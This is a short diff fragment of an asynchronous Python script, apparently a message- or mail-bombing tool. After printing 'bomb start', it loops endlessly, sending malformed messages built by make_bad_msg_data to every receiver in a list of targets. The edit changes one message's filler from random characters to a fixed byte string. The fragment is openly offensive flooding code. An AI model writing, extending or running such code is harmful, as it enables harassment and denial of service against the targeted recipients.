@@ -108,7 +108,7 @@ async def one(email, targets, wait=0):
             print("bomb start------->>>>>>>")
             while True:
                 for receiver in targets:
-                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
+                    writer.write(make_bad_msg_data(b'a'*20, receiver, 3))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 4))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 5))
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 6))
